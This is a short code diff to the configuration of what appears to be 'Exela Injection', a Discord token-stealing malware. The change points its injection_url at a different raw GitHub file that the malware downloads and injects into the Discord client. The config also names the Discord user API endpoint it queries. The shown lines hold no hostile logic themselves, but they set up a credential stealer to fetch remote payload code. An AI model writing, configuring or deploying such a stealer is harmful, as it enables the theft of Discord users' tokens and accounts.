@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Exela Injection', 
   embed_icon: 'https://i.hizliresim.com/6t31tw2.jpg', 
   embed_color: 0, 
-  injection_url: 'https://raw.githubusercontent.com/quicaxd/Exela-V2.0/main/injection/injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/Raplhs/23123213423543534r3re34534/main/index.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
